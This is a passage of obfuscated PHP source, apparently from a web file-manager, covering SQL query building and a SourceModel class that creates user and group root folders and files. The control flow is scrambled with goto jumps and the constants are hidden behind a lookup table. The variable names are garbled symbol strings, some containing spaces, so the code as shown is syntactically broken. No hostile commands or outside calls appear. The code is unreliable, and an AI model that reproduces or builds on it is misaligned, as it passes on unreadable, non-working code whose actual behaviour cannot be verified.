= in_array(strtoupper(trim($dãôìÖÈ“ó)), array($FçÛâ»Ìà∏[985], $FçÛâ»Ìà∏[986])) ? $FçÛâ»Ìà∏[50] . $dãôìÖÈ“ó : $FçÛâ»Ìà∏[33]; if (preg_match($FçÛâ»Ìà∏[987], $dæ‰‚ª∆´)) { $bäÉÕô´⁄‰[] = $this->parseKey($dæ‰‚ª∆´) . $dãôìÖÈ“ó; } else { think_exception($FçÛâ»Ìà∏[988] . $dæ‰‚ª∆´); } } } $fÔÖıÆâÊ§ = implode($FçÛâ»Ìà∏[47], $bäÉÕô´⁄‰); } return !empty($fÔÖıÆâÊ§) ? $FçÛâ»Ìà∏[989] . $fÔÖıÆâÊ§ : $FçÛâ»Ìà∏[33]; } protected function parseGroup($B±Â—ÑıÆã) { $a∫©Ç≈ÇÜ‡ =& $_SERVER[ú∫]; return !empty($B±Â—ÑıÆã) ? $a∫©Ç≈ÇÜ‡[990] . $B±Â—ÑıÆã : $a∫©Ç≈ÇÜ‡[33]; } protected function parseHaving($BÏÑß∑˜⁄¥) { $D£ÙùÊ≈ûŸ =& $_SERVER[ú∫]; return !empty($BÏÑß∑˜⁄¥) ? $D£ÙùÊ≈ûŸ[991] . $BÏÑß∑˜⁄¥ : $D£ÙùÊ≈ûŸ[33]; } protected function parseComment($aÖıö…“›å) { $eÑúôºˆ±Œ =& $_SERVER[ú∫]; return !empty($aÖıö…“›å) ? $eÑúôºˆ±Œ[992] . $aÖıö…“›å . $eÑúôºˆ±Œ[993] : $eÑúôºˆ±Œ[33]; } protected function parseDistinct($Bô¢Ñﬁ¶‘ƒ) { $dãƒˆ⁄”§Ë =& $_SERVER[ú∫]; return !empty($Bô¢Ñﬁ¶‘ƒ) ? $dãƒˆ⁄”§Ë[994] : $dãƒˆ⁄”§Ë[33]; } protected function parseUnion($FŒ»ëµ¯…®) { $F≈Î§—ﬂÔ· =& $_SERVER[ú∫]; if (empty($FŒ»ëµ¯…®)) { return $F≈Î§—ﬂÔ·[33]; } if (isset($FŒ»ëµ¯…®[$F≈Î§—ﬂÔ·[346]])) { $aàˆ™§‡±’ = $F≈Î§—ﬂÔ·[995]; unset($FŒ»ëµ¯…®[$F≈Î§—ﬂÔ·[346]]); } else { $aàˆ™§‡±’ = $F≈Î§—ﬂÔ·[996]; } foreach ($FŒ»ëµ¯…® as $a¶Óó»ê€ ) { $bµ·±ªÒ∆˜[] = $aàˆ™§‡±’ . (is_array($a¶Óó»ê€ ) ? $this->buildSelectSql($a¶Óó»ê€ ) : $a¶Óó»ê€ ); } return implode($F≈Î§—ﬂÔ·[50], $bµ·±ªÒ∆˜); } public function insert($AÜÑëÇ€íÓ, $A‘√ªÃºªº = array(), $CôÕœ≈Ñ¿ˆ = false) { goto eØÜÖßÖ√í; CˆâéßœÙ¶: $FÉÉ◊ÖùÖ≤ .= $this->parseComment(!empty($A‘√ªÃºªº[$DÂÿƒ•ºæÒ[352]]) ? $A‘√ªÃºªº[$DÂÿƒ•ºæÒ[352]] : $DÂÿƒ•ºæÒ[33]); return $this->execute($FÉÉ◊ÖùÖ≤, $this->parseBind(!empty($A‘√ªÃºªº[$DÂÿƒ•ºæÒ[283]]) ? $A‘√ªÃºªº[$DÂÿƒ•ºæÒ[283]] : array())); goto fœÜÈêô∏ë; AŒ°–éÖÚÁ: foreach ($AÜÑëÇ€íÓ as $D¨Ã‘»å¿Î => $FÎè‹â√ŒÜ) { if (is_array($FÎè‹â√ŒÜ) && $DÂÿƒ•ºæÒ[295] == $FÎè‹â√ŒÜ[0]) { $E◊òπòÑ∏Â[] = $this->parseKey($D¨Ã‘»å¿Î); $cå˘‰πØ¿Ú[] = $FÎè‹â√ŒÜ[1]; } elseif (is_scalar($FÎè‹â√ŒÜ) || is_null($FÎè‹â√ŒÜ)) { $E◊òπòÑ∏Â[] = $this->parseKey($D¨Ã‘»å¿Î); $cå˘‰πØ¿Ú[] = $this->parseValue($FÎè‹â√ŒÜ); } } $FÉÉ◊ÖùÖ≤ = ($CôÕœ≈Ñ¿ˆ ? $DÂÿƒ•ºæÒ[867] : $DÂÿƒ•ºæÒ[868]) . $DÂÿƒ•ºæÒ[869] . $this->parseTable($A‘√ªÃºªº[$DÂÿƒ•ºæÒ[277]]) . $DÂÿƒ•ºæÒ[863] . implode($DÂÿƒ•ºæÒ[47], $E◊òπòÑ∏Â) . $DÂÿƒ•ºæÒ[864] . implode($DÂÿƒ•ºæÒ[47], $cå˘‰πØ¿Ú) . $DÂÿƒ•ºæÒ[865]; $FÉÉ◊ÖùÖ≤ .= $this->parseLock(isset($A‘√ªÃºªº[$DÂÿƒ•ºæÒ[812]]) ? $A‘√ªÃºªº[$DÂÿƒ•ºæÒ[812]] : !1); goto CˆâéßœÙ¶; eØÜÖßÖ√í: $DÂÿƒ•ºæÒ =& $_SERVER[ú∫]; $cå˘‰πØ¿Ú = $E◊òπòÑ∏Â = array(); $this->model = $A‘√ªÃºªº[$DÂÿƒ•ºæÒ[279]]; goto AŒ°–éÖÚÁ; fœÜÈêô∏ë: } public function selectInsert($F´îÃôﬂÃæ, $b Øø¢â—¬, $D ∑Ãé”ÁÏ = array()) { goto a°ä´üÛ⁄; eœœæ∆ò¶: return $this->execute($AŸ¶ôôøçæ, $this->parseBind(!empty($D ∑Ãé”ÁÏ[$b”êä´ò„é[283]]) ? $D ∑Ãé”ÁÏ[$b”êä´ò„é[283]] : array())); goto AË˜·∂úûœ; d˜∞À·ﬂåâ: array_walk($F´îÃôﬂÃæ, array($this, $b”êä´ò„é[866])); $AŸ¶ôôøçæ = $b”êä´ò„é[997] . $this->parseTable($b Øø¢â—¬) . $b”êä´ò„é[863] . implode($b”êä´ò„é[47], $F´îÃôﬂÃæ) . $b”êä´ò„é[975]; $AŸ¶ôôøçæ .= $this->buildSelectSql($D ∑Ãé”ÁÏ); goto eœœæ∆ò¶; a°ä´üÛ⁄: $b”êä´ò„é =& $_SERVER[ú∫]; $this->model = $D ∑Ãé”ÁÏ[$b”êä´ò„é[279]]; if (is_string($F´îÃôﬂÃæ)) { $F´îÃôﬂÃæ = explode($b”êä´ò„é[47], $F´îÃôﬂÃæ); } goto d˜∞À·ﬂåâ; AË˜·∂úûœ: } public function update($a¨úïŒ°Îè, $b≤œ«Ìí¯î) { $fãÓ§∫ÍÎÕ =& $_SERVER[ú∫]; $this->model = $b≤œ«Ìí¯î[$fãÓ§∫ÍÎÕ[279]]; $DƒÎÎ£˜¡´ = $fãÓ§∫ÍÎÕ[998] . $this->parseTable($b≤œ«Ìí¯î[$fãÓ§∫ÍÎÕ[277]]) . $this->parseSet($a¨úïŒ°Îè) . $this->parseWhere(!empty($b≤œ«Ìí¯î[$fãÓ§∫ÍÎÕ[273]]) ? $b≤œ«Ìí¯î[$fãÓ§∫ÍÎÕ[273]] : $fãÓ§∫ÍÎÕ[33]) . $this->parseOrder(!empty($b≤œ«Ìí¯î[$fãÓ§∫ÍÎÕ[363]]) ? $b≤œ«Ìí¯î[$fãÓ§∫ÍÎÕ[363]] : $fãÓ§∫ÍÎÕ[33]) . $this->parseLimit(!empty($b≤œ«Ìí¯î[$fãÓ§∫ÍÎÕ[290]]) ? $b≤œ«Ìí¯î[$fãÓ§∫ÍÎÕ[290]] : $fãÓ§∫ÍÎÕ[33]) . $this->parseLock(isset($b≤œ«Ìí¯î[$fãÓ§∫ÍÎÕ[812]]) ? $b≤œ«Ìí¯î[$fãÓ§∫ÍÎÕ[812]] : !1) . $this->parseComment(!empty($b≤œ«Ìí¯î[$fãÓ§∫ÍÎÕ[352]]) ? $b≤œ«Ìí¯î[$fãÓ§∫ÍÎÕ[352]] : $fãÓ§∫ÍÎÕ[33]); return $this->execute($DƒÎÎ£˜¡´, $this->parseBind(!empty($b≤œ«Ìí¯î[$fãÓ§∫ÍÎÕ[283]]) ? $b≤œ«Ìí¯î[$fãÓ§∫ÍÎÕ[283]] : array())); } public function delete($BƒùÆÚ‹®¯ = array()) { $Aø”Ï‡‚¥˜ =& $_SERVER[ú∫]; $this->model = $BƒùÆÚ‹®¯[$Aø”Ï‡‚¥˜[279]]; $DœÖ˜à˘öâ = $Aø”Ï‡‚¥˜[999] . $this->parseTable($BƒùÆÚ‹®¯[$Aø”Ï‡‚¥˜[277]]) . $this->parseWhere(!empty($BƒùÆÚ‹®¯[$Aø”Ï‡‚¥˜[273]]) ? $BƒùÆÚ‹®¯[$Aø”Ï‡‚¥˜[273]] : $Aø”Ï‡‚¥˜[33]) . $this->parseOrder(!empty($BƒùÆÚ‹®¯[$Aø”Ï‡‚¥˜[363]]) ? $BƒùÆÚ‹®¯[$Aø”Ï‡‚¥˜[363]] : $Aø”Ï‡‚¥˜[33]) . $this->parseLimit(!empty($BƒùÆÚ‹®¯[$Aø”Ï‡‚¥˜[290]]) ? $BƒùÆÚ‹®¯[$Aø”Ï‡‚¥˜[290]] : $Aø”Ï‡‚¥˜[33]) . $this->parseLock(isset($BƒùÆÚ‹®¯[$Aø”Ï‡‚¥˜[812]]) ? $BƒùÆÚ‹®¯[$Aø”Ï‡‚¥˜[812]] : !1) . $this->parseComment(!empty($BƒùÆÚ‹®¯[$Aø”Ï‡‚¥˜[352]]) ? $BƒùÆÚ‹®¯[$Aø”Ï‡‚¥˜[352]] : $Aø”Ï‡‚¥˜[33]); return $this->execute($DœÖ˜à˘öâ, $this->parseBind(!empty($BƒùÆÚ‹®¯[$Aø”Ï‡‚¥˜[283]]) ? $BƒùÆÚ‹®¯[$Aø”Ï‡‚¥˜[283]] : array())); } public function select($A¶ë§„ÕÓá = array()) { goto aòπ‹àêç≤; D§ºââó≤¬: if ($BÀ◊Ö–ÿß÷ && !1 !== $B…º≠¥å¿∫) { think_cache($aœÿªÕäØ , $B…º≠¥å¿∫, $BÀ◊Ö–ÿß÷); } return $B…º≠¥å¿∫; goto a®â€¿≈·ü; aòπ‹àêç≤: $dä…©˘Ïç∞ =& $_SERVER[ú∫]; $this->model = $A¶ë§„ÕÓá[$dä…©˘Ïç∞[279]]; $f”ˆêΩ†õé = $this->buildSelectSql($A¶ë§„ÕÓá); goto cÖÙ£‘Ãé“; cÖÙ£‘Ãé“: $BÀ◊Ö–ÿß÷ = isset($A¶ë§„ÕÓá[$dä…©˘Ïç∞[347]]) ? $A¶ë§„ÕÓá[$dä…©˘Ïç∞[347]] : !1; if ($BÀ◊Ö–ÿß÷) { $aœÿªÕäØ  = is_string($BÀ◊Ö–ÿß÷[$dä…©˘Ïç∞[93]]) ? $BÀ◊Ö–ÿß÷[$dä…©˘Ïç∞[93]] : $dä…©˘Ïç∞[1000] . md5($f”ˆêΩ†õé); $CìπŸïÃﬁ£ = think_cache($aœÿªÕäØ , $dä…©˘Ïç∞[33], $BÀ◊Ö–ÿß÷); if (!1 !== $CìπŸïÃﬁ£) { return $CìπŸïÃﬁ£; } } $B…º≠¥å¿∫ = $this->query($f”ˆêΩ†õé, $this->parseBind(!empty($A¶ë§„ÕÓá[$dä…©˘Ïç∞[283]]) ? $A¶ë§„ÕÓá[$dä…©˘Ïç∞[283]] : array())); goto D§ºââó≤¬; a®â€¿≈·ü: } public function buildSelectSql($aÑºÕÜ≠ÊÁ = array()) { goto fÑœ¯Ò∆ƒú; fÑœ¯Ò∆ƒú: $Eâæ€ª˜»≥ =& $_SERVER[ú∫]; if (isset($aÑºÕÜ≠ÊÁ[$Eâæ€ª˜»≥[351]])) { if (strpos($aÑºÕÜ≠ÊÁ[$Eâæ€ª˜»≥[351]], $Eâæ€ª˜»≥[47])) { list($cüÍêéÓ∆‘, $dáıååº·å) = explode($Eâæ€ª˜»≥[47], $aÑºÕÜ≠ÊÁ[$Eâæ€ª˜»≥[351]]); } else { $cüÍêéÓ∆‘ = $aÑºÕÜ≠ÊÁ[$Eâæ€ª˜»≥[351]]; } $cüÍêéÓ∆‘ = $cüÍêéÓ∆‘ ? $cüÍêéÓ∆‘ : 1; $dáıååº·å = isset($dáıååº·å) ? $dáıååº·å : (is_numeric($aÑºÕÜ≠ÊÁ[$Eâæ€ª˜»≥[290]]) ? $aÑºÕÜ≠ÊÁ[$Eâæ€ª˜»≥[290]] : 20); $Dœ¯ÀàÃ¶á = $dáıååº·å * ((int) $cüÍêéÓ∆‘ - 1); $aÑºÕÜ≠ÊÁ[$Eâæ€ª˜»≥[290]] = $Dœ¯ÀàÃ¶á . $Eâæ€ª˜»≥[47] . $dáıååº·å; } if (think_config($Eâæ€ª˜»≥[1001])) { $Cƒ–⁄Á∂ƒµ = $Eâæ€ª˜»≥[1002] . md5(serialize($aÑºÕÜ≠ÊÁ)); $eŒ‘É◊Õ¢Œ = think_cache($Cƒ–⁄Á∂ƒµ); if ($eŒ‘É◊Õ¢Œ) { return $eŒ‘É◊Õ¢Œ; } } goto E•√¨ä®Ò†; D˜èÂ÷—Ö¨: return $CÖ“˘Ò±›π; goto E÷ØóÃ·â¬; E•√¨ä®Ò†: $CÖ“˘Ò±›π = $this->parseSql($this->selectSql, $aÑºÕÜ≠ÊÁ); $CÖ“˘Ò±›π .= $this->parseLock(isset($aÑºÕÜ≠ÊÁ[$Eâæ€ª˜»≥[812]]) ? $aÑºÕÜ≠ÊÁ[$Eâæ€ª˜»≥[812]] : !1); if (isset($Cƒ–⁄Á∂ƒµ)) { think_cache($Cƒ–⁄Á∂ƒµ, $CÖ“˘Ò±›π); } goto D˜èÂ÷—Ö¨; E÷ØóÃ·â¬: } public function parseSql($eëôŒ∞¥ãÛ, $EÎ˘¿”Àº• = array()) { $DµœòŒ†Á∫ =& $_SERVER[ú∫]; $eëôŒ∞¥ãÛ = str_replace(array($DµœòŒ†Á∫[1003], $DµœòŒ†Á∫[1004], $DµœòŒ†Á∫[1005], $DµœòŒ†Á∫[1006], $DµœòŒ†Á∫[1007], $DµœòŒ†Á∫[1008], $DµœòŒ†Á∫[1009], $DµœòŒ†Á∫[1010], $DµœòŒ†Á∫[1011], $DµœòŒ†Á∫[1012], $DµœòŒ†Á∫[1013]), array($this->parseTable("{$EÎ˘¿”Àº•[$DµœòŒ†Á∫[277]]}"), $this->parseDistinct(isset($EÎ˘¿”Àº•[$DµœòŒ†Á∫[1014]]) ? $EÎ˘¿”Àº•[$DµœòŒ†Á∫[1014]] : !1), $this->parseField(!empty($EÎ˘¿”Àº•[$DµœòŒ†Á∫[271]]) ? $EÎ˘¿”Àº•[$DµœòŒ†Á∫[271]] : $DµœòŒ†Á∫[182]), $this->parseJoin(!empty($EÎ˘¿”Àº•[$DµœòŒ†Á∫[280]]) ? $EÎ˘¿”Àº•[$DµœòŒ†Á∫[280]] : $DµœòŒ†Á∫[33]), $this->parseWhere(!empty($EÎ˘¿”Àº•[$DµœòŒ†Á∫[273]]) ? $EÎ˘¿”Àº•[$DµœòŒ†Á∫[273]] : $DµœòŒ†Á∫[33]), $this->parseGroup(!empty($EÎ˘¿”Àº•[$DµœòŒ†Á∫[1015]]) ? $EÎ˘¿”Àº•[$DµœòŒ†Á∫[1015]] : $DµœòŒ†Á∫[33]), $this->parseHaving(!empty($EÎ˘¿”Àº•[$DµœòŒ†Á∫[1016]]) ? $EÎ˘¿”Àº•[$DµœòŒ†Á∫[1016]] : $DµœòŒ†Á∫[33]), $this->parseOrder(!empty($EÎ˘¿”Àº•[$DµœòŒ†Á∫[363]]) ? $EÎ˘¿”Àº•[$DµœòŒ†Á∫[363]] : $DµœòŒ†Á∫[33]), $this->parseLimit(!empty($EÎ˘¿”Àº•[$DµœòŒ†Á∫[290]]) ? $EÎ˘¿”Àº•[$DµœòŒ†Á∫[290]] : $DµœòŒ†Á∫[33]), $this->parseUnion(!empty($EÎ˘¿”Àº•[$DµœòŒ†Á∫[345]]) ? $EÎ˘¿”Àº•[$DµœòŒ†Á∫[345]] : $DµœòŒ†Á∫[33]), $this->parseComment(!empty($EÎ˘¿”Àº•[$DµœòŒ†Á∫[352]]) ? $EÎ˘¿”Àº•[$DµœòŒ†Á∫[352]] : $DµœòŒ†Á∫[33])), $eëôŒ∞¥ãÛ); return $eëôŒ∞¥ãÛ; } public function getLastSql($AûõÕ∫ìÃª = '') { return $AûõÕ∫ìÃª ? $this->modelSql[$AûõÕ∫ìÃª] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($b÷◊‚ºÑ¡ô) { return addslashes($b÷◊‚ºÑ¡ô); } public function setModel($D∆ú¢é‰É◊) { $this->model = $D∆ú¢é‰É◊; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } goto C˘íõŒÂ¡ﬂ; B∆ıÂÔçóµ: class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($D§ºäÑÛöç) { $cÔ∆ÎÓ€   =& $_SERVER[ú∫]; $d‚ÜÛ”ôËû = Model($cÔ∆ÎÓ€  [502])->where(array($cÔ∆ÎÓ€  [1520] => $D§ºäÑÛöç))->find(); $E˘»á∞ò°è = $this->_mkdirRoot(SourceModel::TYPE_USER, $D§ºäÑÛöç, $d‚ÜÛ”ôËû[$cÔ∆ÎÓ€  [28]]); $this->userDesktopAdd($E˘»á∞ò°è); return $E˘»á∞ò°è; } public function userDesktopAdd($E∆ÉÎß‡Ö‹) { $dâ«•¡úºª =& $_SERVER[ú∫]; $Bó¥¿≠Óä∑ = LNG($dâ«•¡úºª[1951]); $c’Éˆ¶áÀÖ = $this->mkdir($E∆ÉÎß‡Ö‹, $Bó¥¿≠Óä∑); $this->metaSet($c’Éˆ¶áÀÖ, $dâ«•¡úºª[1952], $dâ«•¡úºª[87]); $this->metaSet($E∆ÉÎß‡Ö‹, $dâ«•¡úºª[1953], $c’Éˆ¶áÀÖ); } public function groupRootAdd($F€ü´ÆßÜÚ) { $eÆ≠ƒàº€Ù =& $_SERVER[ú∫]; $dÁ§⁄“’°∫ = Model($eÆ≠ƒàº€Ù[486])->where(array($eÆ≠ƒàº€Ù[1770] => $F€ü´ÆßÜÚ))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $F€ü´ÆßÜÚ, $dÁ§⁄“’°∫[$eÆ≠ƒàº€Ù[28]]); } public function systemRootPathAdd($B„ßÕ•”Áˆ) { if ($B„ßÕ•”Áˆ != $_SERVER[ú∫][505]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $B„ßÕ•”Áˆ); } public function userRootRemove($eÀ·§∞Í£÷) { $B…âé‡“û = $this->sourceRoot(SourceModel::TYPE_USER, $eÀ·§∞Í£÷); if (!$B…âé‡“û) { return; } $this->remove($B…âé‡“û, !1); } public function groupRootRemove($D‰¶¡Áâ˘“) { $C¨ä–ﬂöçÃ = $this->sourceRoot(SourceModel::TYPE_GROUP, $D‰¶¡Áâ˘“); if (!$C¨ä–ﬂöçÃ) { return; } $this->remove($C¨ä–ﬂöçÃ, !1); } private function _mkdirRoot($d‰∫“¯Éö¯, $C€ÜÓÙûé‹, $få´Œœ–∆™) { goto cÜ–õµÕ ¥; CÕ«ËÉ˜€ø: CacheLock::unlock($D√ÍÚå€‰ã); return $A™Ÿ«‹Ò«·; goto EÖßá–ÆÃé; CÈëí∑∫åó: $A™Ÿ«‹Ò«· = $this->add($A’∆›©ÿÕ‘); $E”Ëº∂≈√ª = array($A∆ñÁıÜÓú[555] => short_id($A™Ÿ«‹Ò«·)); $this->where(array($A∆ñÁıÜÓú[410] => $A™Ÿ«‹Ò«·))->save($E”Ëº∂≈√ª); goto CÕ«ËÉ˜€ø; cÜ–õµÕ ¥: $A∆ñÁıÜÓú =& $_SERVER[ú∫]; $A’∆›©ÿÕ‘ = array($A∆ñÁıÜÓú[394] => 0, $A∆ñÁıÜÓú[549] => $d‰∫“¯Éö¯, $A∆ñÁıÜÓú[550] => $C€ÜÓÙûé‹, $A∆ñÁıÜÓú[546] => 1, $A∆ñÁıÜÓú[551] => USER_ID, $A∆ñÁıÜÓú[552] => USER_ID, $A∆ñÁıÜÓú[547] => $A∆ñÁıÜÓú[33], $A∆ñÁıÜÓú[553] => $A∆ñÁıÜÓú[498], $A∆ñÁıÜÓú[422] => 0, $A∆ñÁıÜÓú[548] => 0, $A∆ñÁıÜÓú[448] => 0, $A∆ñÁıÜÓú[554] => $A∆ñÁıÜÓú[33]); if ($DÖ√©©¿ô∏ = $this->where($A’∆›©ÿÕ‘)->find()) { return $DÖ√©©¿ô∏[$A∆ñÁıÜÓú[395]]; } goto B´‰ıﬁÏÁÏ; B´‰ıﬁÏÁÏ: $D√ÍÚå€‰ã = "\x4d\x6f\144\x65\154\123\157\165\162\143\x65\56\155\153\x64\151\x72\122\157\157\164\x2e{$d‰∫“¯Éö¯}\x2e{$C€ÜÓÙûé‹}\56" . $få´Œœ–∆™; CacheLock::lock($D√ÍÚå€‰ã); $A’∆›©ÿÕ‘[$A∆ñÁıÜÓú[28]] = $få´Œœ–∆™; goto CÈëí∑∫åó; EÖßá–ÆÃé: } private function sourceRoot($bìçÓÓ¯∞í, $A∫ä¶Ωã±…, $a‘—Çûüπ‚ = false) { $bŒ‘å”ç√ë =& $_SERVER[ú∫]; $A‹âÙã§áî = array($bŒ‘å”ç√ë[394] => 0, $bŒ‘å”ç√ë[549] => $bìçÓÓ¯∞í, $bŒ‘å”ç√ë[550] => $A∫ä¶Ωã±…); if ($fø⁄òÔ≤æÔ = $this->where($A‹âÙã§áî)->find()) { return $a‘—Çûüπ‚ ? $fø⁄òÔ≤æÔ : $fø⁄òÔ≤æÔ[$bŒ‘å”ç√ë[395]]; } return !1; } public function sourceRootGroup($CÈ¢ﬂÜä∫) { goto C∑áôÚ¿∞Ò; A≈œ»¶ÇÒ: $this->selectPageReset(); $C‰¢ºÊ◊çﬂ = $this->listSource($C©ˆ»Õ∆“£, 1000); $this->selectPageRestore(); goto aÿÌÛ⁄§ºö; aÿÌÛ⁄§ºö: return array_to_keyvalue($C‰¢ºÊ◊çﬂ[$E•íÖ´ª©µ[75]], $E•íÖ´ª©µ[484]); goto a˘Ü≤≠€ª≈; C∑áôÚ¿∞Ò: $E•íÖ´ª©µ =& $_SERVER[ú∫]; if (is_string($CÈ¢ﬂÜä∫)) { $CÈ¢ﬂÜä∫ = array($CÈ¢ﬂÜä∫); } $C©ˆ»Õ∆“£ = array($E•íÖ´ª©µ[394] => 0, $E•íÖ´ª©µ[549] => SourceModel::TYPE_GROUP, $E•íÖ´ª©µ[550] => array($E•íÖ´ª©µ[7], $CÈ¢ﬂÜä∫)); goto A≈œ»¶ÇÒ; a˘Ü≤≠€ª≈: } public function mkfile($fà›ï‚„œ», $DÉ ∆åŒƒø, $D∏πêâç«ú = '', $C¯§ÊÎ‚ë¬ = REPEAT_RENAME) { $a’õØ≥í–‚ =& $_SERVER[ú∫]; $cî¢ÊÉ…ö± = Model($a’õØ≥í–‚[571])->addFileByContent($D∏πêâç«ú, $DÉ ∆åŒƒø); return $this->_createFileCall($fà›ï‚„œ», $DÉ ∆åŒƒø, $cî¢ÊÉ…ö±, $C¯§ÊÎ‚ë¬, $a’õØ≥í–‚[1216]); } public function addFile($eî‹üàØÏŒ, $d†ôç¬Öã», $Dúå÷∫ ”ÿ, $dÛÑï‰‰™ù = false, $eûßÚÖøñ› = REPEAT_RENAME) { $bâ◊‚≠÷ÑÖ = Model($_SERVER[ú∫][571])->addFile($d†ôç¬Öã», $Dúå÷∫ ”ÿ, $dÛÑï‰‰™ù); return $this->_createFileCall($eî‹üàØÏŒ, $Dúå÷∫ ”ÿ, $bâ◊‚≠÷ÑÖ, $eûßÚÖøñ›); } public function addFileByFileID($eìáÚ•èÑÜ, $b∑«áﬂ≥åœ, $A¯ﬁÛá¡ª˜, $EâŒË »‡≠ = REPEAT_RENAME) { $aò”å≥ƒÕê =& $_SERVER[ú∫]; $e»–∫ŸºÖ› = Model($aò”å≥ƒÕê[571])->find($b∑«áﬂ≥åœ); Model($aò”å≥ƒÕê[571])->linkAdd($b∑«áﬂ≥åœ); return $this->_createFileCall($eìáÚ•èÑÜ, $A¯ﬁÛá¡ª˜, $e»–∫ŸºÖ›, $EâŒË »‡≠); } public function addFileByRemote($B≠√“¿òÆÀ, $e¬–Êã¯ Ü, $F¥ªåÍÂÒ∑, $dÁõäóäÏ‘ = array(), $F≤î…Ñµ•È = REPEAT_RENAME) { $AéÙñ•Ô≈Õ = Model($_SERVER[ú∫][571])->addFileByRemote($e¬–Êã¯ Ü, $F¥ªåÍÂÒ∑, $dÁõäóäÏ‘); return $this->_createFileCall($B≠√“¿òÆÀ, $F¥ªåÍÂÒ∑, $AéÙñ•Ô≈Õ, $F≤î…Ñµ•È); } private function _createFileCall($Eã¿Ë…‚§µ, $A—Àéù…˜†, $AΩ Ø˘ëÂã, $CÚÇ®®îá„, $DıºÊ¨ñﬂ¯ = "\165\x70\154\157\x61\x64") { goto A√ïÆﬁƒÂò; f¶œ£Ñï‰û: if ($A®à±£¢·à && $BÒò∑ß÷èπ && $BÒò∑ß÷èπ != $d”√±âë£™) { Model($BÊ··ËÏŒı[1922])->eventCreate($BÒò∑ß÷èπ, $DıºÊ¨ñﬂ¯); } $this->lockWriteEnd($Eã¿Ë…‚§µ, $A—Àéù…˜†); return $BÒò∑ß÷èπ; goto a∂îÎ›íª¬; e÷»ÖÖÎ’™: $d”√±âë£™ = $this->fileNameExist($Eã¿Ë…‚§µ, $A—Àéù…˜†); $BÒò∑ß÷èπ = $this->_createFile($Eã¿Ë…‚§µ, $A—Àéù…˜†, $AΩ Ø˘ëÂã, $CÚÇ®®îá„, $A®à±£¢·à); if (!$A®à±£¢·à) { Model($BÊ··ËÏŒı[450])->remove($AΩ Ø˘ëÂã[$BÊ··ËÏŒı[447]]); } goto f¶œ£Ñï‰û; A√ïÆﬁƒÂò: $BÊ··ËÏŒı =& $_SERVER[ú∫]; $A®à±£¢·à = !1; $this->lockWriteStart($Eã¿Ë…‚§µ, $A—Àéù…˜†); goto e÷»ÖÖÎ’™; a∂îÎ›íª¬: } public function mkdir($b‚ºÂÇ‘Ñá, $c–é´ä±‹™, $D¯Ãû¬¶Ê˘ = REPEAT_SKIP) { goto d∆’Æ‘åÖË; Cêƒµ‰äˆö: return $eô…¢˘è››; goto fûûøö•¶¶; C¯…Ùÿ˜öÂ: $eô…¢˘è›› = $this->_addSoure($CÒ™≤ﬁéæ≤, $DËΩñ™˜†÷); Model($Bõ‘ê¯à§Ÿ[1922])->eventCreate($eô…¢˘è››, $Bõ‘ê¯à§Ÿ[1217]); $this->lockWriteEnd($b‚ºÂÇ‘Ñá, $c–é´ä±‹™); goto Cêƒµ‰äˆö; d∆’Æ‘åÖË: $Bõ‘ê¯à§Ÿ =& $_SERVER[ú∫]; $DËΩñ™˜†÷ = $this->sourceInfo($b‚ºÂÇ‘Ñá); if (!$DËΩñ™˜†÷) { return !1; } goto dÆÌ’«Ωπ„; dÆÌ’«Ωπ„: $this->lockWriteStart($b‚ºÂÇ‘Ñá, $c–é´ä±‹™); if ($D¯Ãû¬¶Ê˘ !== !1) { $bÿÙÕ“‡Û≤ = $this->fileNameExist($b‚ºÂÇ‘Ñá, $c–é´ä±‹™); if ($bÿÙÕ“‡Û≤ && $D¯Ãû¬¶Ê˘ != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($b‚ºÂÇ‘Ñá, $c–é´ä±‹™); return $bÿÙÕ“‡Û≤; } $c–é´ä±‹™ = $this->fileNameAuto($b‚ºÂÇ‘Ñá, $c–é´ä±‹™, $D¯Ãû¬¶Ê˘); } $CÒ™≤ﬁéæ≤ = array($Bõ‘ê¯à§Ÿ[546] => 1, $Bõ‘ê¯à§Ÿ[413] => $c–é´ä±‹™, $Bõ‘ê¯à§Ÿ[547] => $Bõ‘ê¯à§Ÿ[33], $Bõ‘ê¯à§Ÿ[448] => 0, $Bõ‘ê¯à§Ÿ[548] => 0); goto C¯…Ùÿ˜öÂ; fûûøö•¶¶: } private function _createFile($DÚ„üú√…Î, $Dùﬁ§À¨√ß, $c†ôó€∏´ß, $b¿”–©Ïıæ, &$Aæ»õÆÈûÖ) { goto d…µª¢®Ì; eæÈ±¨â¶¢: $A⁄‰Ó˘ ë” = array($CˆëÓÛñê£[546] => 0, $CˆëÓÛñê£[413] => $Dùﬁ§À¨√ß, $CˆëÓÛñê£[547] => substr(get_path_ext($Dùﬁ§À¨√ß), 0, 10), $CˆëÓÛñê£[448] => $c†ôó€∏´ß[$CˆëÓÛñê£[447]], $CˆëÓÛñê£[548] => $c†ôó€∏´ß[$CˆëÓÛñê£[78]]); $béË’·∑±è = $this->_addSoure($A⁄‰Ó˘ ë”, $bÉëÙÆˆéå); $this->folderSizeReset($DÚ„üú√…Î, intval($A⁄‰Ó˘ ë”[$CˆëÓÛñê£[78]])); goto dÊÃπ√ïéÎ; dÊÃπ√ïéÎ: return $béË’·∑±è; goto dÁ⁄ãä˘ä⁄; d…µª¢®Ì: $CˆëÓÛñê£ =& $_SERVER[ú∫]; $bÉëÙÆˆéå = $this->sourceInfo($DÚ„üú√…Î); if (!$c†ôó€∏´ß || !$bÉëÙÆˆéå) { return !1; } goto cÍÀ¥¢“õï; cÍÀ¥¢“õï: if ($b¿”–©Ïıæ !== !1) { $F≠√¥ΩœÙÃ = $this->fileNameExist($DÚ„üú√…Î, $Dùﬁ§À¨√ß); } $Aæ»õÆÈûÖ = !0; if ($b¿”–©Ïıæ && $F≠√¥ΩœÙÃ) { if ($b¿”–©Ïıæ == REPEAT_SKIP) { $Aæ»õÆÈûÖ = !1; return $F≠√¥ΩœÙÃ; } else { if ($b¿”–©Ïıæ == REPEAT_REPLACE) { $dìü¥Óç•◊ = $this->sourceInfo($F≠√¥ΩœÙÃ); $cåπÀã’â§ = $this->fileHistory($dìü¥Óç•◊, 